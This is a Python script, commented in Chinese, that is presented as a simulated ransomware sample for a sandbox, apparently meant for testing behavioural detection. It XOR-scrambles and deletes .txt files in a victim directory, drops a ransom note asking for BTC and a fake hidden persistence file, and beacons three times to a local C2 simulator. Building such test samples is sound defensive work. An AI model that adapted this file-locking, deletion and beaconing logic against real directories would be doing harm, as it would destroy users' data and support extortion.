#!/usr/bin/env python3
# =============================================================================
# 26 · 恶意样本（模拟）——只在 /sandbox 靶目录内动作，绝不碰真实系统
# 行为剧本（对齐「批量加密 + 定时外联」的勒索画像）：
#   ① 侦察：列目标目录
#   ② 子进程 #1：批量「加密」——逐文件 XOR 变形、落盘 .locked、删除原件
#   ③ 勒索说明文件 README_DECRYPT.txt
#   ④ 隐藏文件 /sandbox/.update_cache（模拟持久化遗落物）
#   ⑤ 子进程 #2：向 C2 模拟器（127.0.0.1:9099）发 3 次 HTTP 心跳
# =============================================================================
import os
import socket
import subprocess
import sys
import time
from pathlib import Path

VICTIM = Path(os.environ.get("SANDBOX_VICTIM", "/sandbox/victim"))
ROOT = Path(os.environ.get("SANDBOX_ROOT", "/sandbox"))
C2_HOST, C2_PORT = os.environ.get("SANDBOX_C2", "127.0.0.1:9099").split(":")

ENCRYPT_WORKER = r'''
import sys, time
from pathlib import Path
victim = Path(sys.argv[2])
for f in sorted(victim.glob("*.txt")):
    data = f.read_bytes()
    enc = bytes(b ^ 0x5A for b in data)
    f.with_name(f.name + ".locked").write_bytes(enc)
    f.unlink()
    time.sleep(0.15)
'''

BEACON_WORKER = r'''
import socket, sys, time
host, port = sys.argv[2], int(sys.argv[3])
for i in range(3):
    s = socket.create_connection((host, port), timeout=3)
    s.sendall(b"GET /beacon HTTP/1.1\r\nHost: c2-sim\r\n\r\n")
    s.recv(256)
    time.sleep(0.5)
    s.close()
    time.sleep(0.8)
'''


def main():
    print("[sample] 侦察：列目标目录", flush=True)
    for f in sorted(VICTIM.glob("*")):
        f.stat()

    print("[sample] 子进程 #1：批量加密", flush=True)
    w1 = subprocess.Popen([sys.executable, "-c", ENCRYPT_WORKER, "encrypt-worker", str(VICTIM)])
    w1.wait()

    note = ROOT / "README_DECRYPT.txt"
    note.write_text("Your files are locked. Send BTC to recover.\n")
    print("[sample] 勒索说明已落盘", flush=True)

    (ROOT / ".update_cache").write_bytes(b"\x7fELF-fake-persistence\n")
    print("[sample] 隐藏文件已落盘", flush=True)

    print("[sample] 子进程 #2：定时外联心跳", flush=True)
    w2 = subprocess.Popen([sys.executable, "-c", BEACON_WORKER, "beacon-worker", C2_HOST, C2_PORT])
    w2.wait()

    print("[sample] 剧本演完", flush=True)


if __name__ == "__main__":
    main()
